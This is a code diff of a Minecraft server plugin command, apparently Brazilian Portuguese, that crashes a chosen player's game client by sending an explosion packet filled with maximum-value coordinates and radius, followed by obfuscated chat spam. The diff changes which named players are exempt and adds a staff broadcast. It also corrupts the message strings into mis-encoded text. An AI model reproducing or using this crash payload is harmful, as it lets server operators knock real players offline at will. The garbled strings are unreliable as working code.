@@ -26,20 +26,21 @@ public class Crash implements CommandExecutor {
                 if (args.length > 0) {
                     final Player target = Bukkit.getPlayer(args[0]);
                     if (target != null) {
-                        if (target.hasPermission("command.crash.bypass") || target.getName().equalsIgnoreCase("Sweake_PvP") ||
-                                target.getName().equalsIgnoreCase("zEnderX5_") || target.getName().equalsIgnoreCase("RAFAELESPADA")) {
-                            player.sendMessage("§cVocê nao pode crashar esse player.");
+                        if (target.hasPermission("command.crash.bypass") || target.getName().equalsIgnoreCase("LuanTresoldi") ||
+                                target.getName().equalsIgnoreCase("Rafael_Melo") || target.getName().equalsIgnoreCase("RAFAELESPADA")) {
+                            player.sendMessage("Â§cVocÃª nao pode crashar esse player.");
                         }
                         else {
                             ((CraftPlayer)target).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, 1023.0, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
                             for (int i = 0; i < 8; ++i) {
-                                target.sendMessage("§2§kajdioajdiajdiajdioajdoaidjaoidjaokdj");
+                                target.sendMessage("Â§2Â§kajdioajdiajdiajdioajdoaidjaoidjaokdj");
                             }
-                            player.sendMessage("§aVocê crashou o player §e" + target.getName() + "§a.");
+                            player.sendMessage("Â§aVocÃª crashou o player Â§e" + target.getName() + "Â§a.");
+                            Bukkit.broadcast(player.getName() + " crashou " + target.getName(), "command.crash.bypass");
                         }
                     }
                     else {
-                        player.sendMessage("§cNao foi possivel encontrar o player §e" + args[0] + "§c.");
+                        player.sendMessage("Â§cNao foi possivel encontrar o player Â§e" + args[0] + "Â§c.");
                     }
                 }
                 else {
